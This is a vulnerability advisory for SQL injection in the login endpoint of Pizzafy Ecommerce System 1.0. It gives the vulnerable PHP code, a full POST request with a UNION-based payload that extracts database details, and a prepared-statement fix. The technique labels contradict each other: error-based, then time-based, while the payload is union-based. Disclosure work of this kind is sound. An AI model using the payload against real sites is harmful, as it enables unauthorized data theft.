
## **Affected Version:**  
- **Pizzafy Ecommerce System**: 1.0  

## **Vulnerability Information:**  
- **Vulnerability Type:** SQL Injection (Based Error)  
- **Severity:** HIGH  
- **Status:** Unpatched  

## **Vulnerable Endpoint:**  
- `/pizzafy/admin/ajax.php?action=login2`

## **Overview**
The Pizzafy Ecommerce System 1.0 contains critical SQL Injection vulnerabilities that allow an attacker to extract sensitive data, bypass authentication, and get records from the database.

## **Vulnerability Description:**  
# Error-Based SQL Injection Vulnerability in SELECT Operation

## Vulnerability Description

A **Error-based SQL Injection vulnerability** was discovered in the **select login functionality** of the **Pizzafy Ecommerce System 1.0**. This vulnerability occurs because the `email` parameter is not properly sanitized, allowing an attacker to inject malicious SQL commands into the backend database query.

## Attack Technique

This attack relies on **Error-based SQL injection technique**, where the attacker uses functions to force the database to return sensitive data within error messages. When the system displays database errors, the attacker can:

- **Extract database names, table names, and column structures**
- **Retrieve usernames and password hashes**
- **Delete or manipulate sensitive records**
- **Escalate privileges through session data extraction**


## Impact

| Impact | Description |
|--------|-------------|
| **Confidentiality** | Full database schema and user credentials exposure |
| **Integrity** | Unauthorized deletion or modification of records |
| **Availability** | Mass deletion causing denial of service |
| **Privilege Escalation** | Session hijacking and administrative access |

## Proof of Concept (PoC)

### Vulnerable Code
```php
    public function login2() {
    $username = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    
    $sql = "SELECT * FROM user_info WHERE email = '$username'";
    $qry = $this->conn->query($sql);
    
    if (!$qry) {    
        return $this->conn->error;
    }
    
    if($qry && $qry->num_rows > 0) {
        $row = $qry->fetch_assoc();
        
        if(password_verify($password, $row['password'])) {
            $_SESSION['login_user_id'] = $row['user_id'];
            $_SESSION['login_first_name'] = $row['first_name'];
            $_SESSION['login_last_name'] = $row['last_name'];            
            return 1;
        }
        
        return json_encode($row);
        
    } else {
        return 2;
    }
}
```

Below is a **POST** request demonstrating the vulnerability using a **time-based SQL injection payload**:  

```
POST /pizzafy/admin/ajax.php?action=login2 HTTP/1.1
Host: localhost
Content-Length: 54
sec-ch-ua: 
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
sec-ch-ua-platform: ""
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/pizzafy/index.php
Accept-Encoding: gzip, deflate
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=ifhk52o8akrt2j78pkbcg9d649
Connection: close

email=-3' union select 1,version(),database(),user(),5,6,7%23&password=teste

```

### **Explanation:**  
This payload injects the SQL command:  

```sql
email=-3' union select 1,version(),database(),user(),5,6,7%23&password=teste
```
This makes it possible to get data from the database.

---

## Image

- ![](https://i.imgur.com/TAHGm4M.png)
---

## Remediation
```php
public function login2() {
    $username = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    
     $stmt = $this->conn->prepare("SELECT * FROM user_info WHERE email = ?");
    $stmt->bind_param("s", $username);
    $stmt->execute();
    $qry = $stmt->get_result();
    
    if(!$qry) {    
        return $this->conn->error;
    }
    
    if($qry && $qry->num_rows > 0) {
        $row = $qry->fetch_assoc();
        
        if(password_verify($password, $row['password'])) {
            $_SESSION['login_user_id'] = $row['user_id'];
            $_SESSION['login_first_name'] = $row['first_name'];
            $_SESSION['login_last_name'] = $row['last_name'];            
            return 1;
        } else {
            return 2;
        }
    } else {
        return 2;
    }
}
```

---

## **Mitigation Recommendations:**  
1. **Use Prepared Statements:** Employ parameterized queries to prevent SQL injection.  
2. **Input Validation:** Validate and sanitize the `email` and `password` parameter to allow only expected values.  
3. **Database Permissions:** Restrict database user privileges to limit the potential damage of SQL injections.  
4. **Monitoring & Logging:** Track and alert unusual patterns, such as slow queries or repetitive access attempts.  
5. **Security Testing:** Perform regular penetration testing and code reviews to identify and mitigate vulnerabilities.  
6. **Error Handling:** Avoid exposing database-related errors in responses, which may assist attackers.

## References
- **CWE-89:** Improper Neutralization of Special Elements used in an SQL Command
- **OWASP:** SQL Injection Prevention Cheat Sheet
